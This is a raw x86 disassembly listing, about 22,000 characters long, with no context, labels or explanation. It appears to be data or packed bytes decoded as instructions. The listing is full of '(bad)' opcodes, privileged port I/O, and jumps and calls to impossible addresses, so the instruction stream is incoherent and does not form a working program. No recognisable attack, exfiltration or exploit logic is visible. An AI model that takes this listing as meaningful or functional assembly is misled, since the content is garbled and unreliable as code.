  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
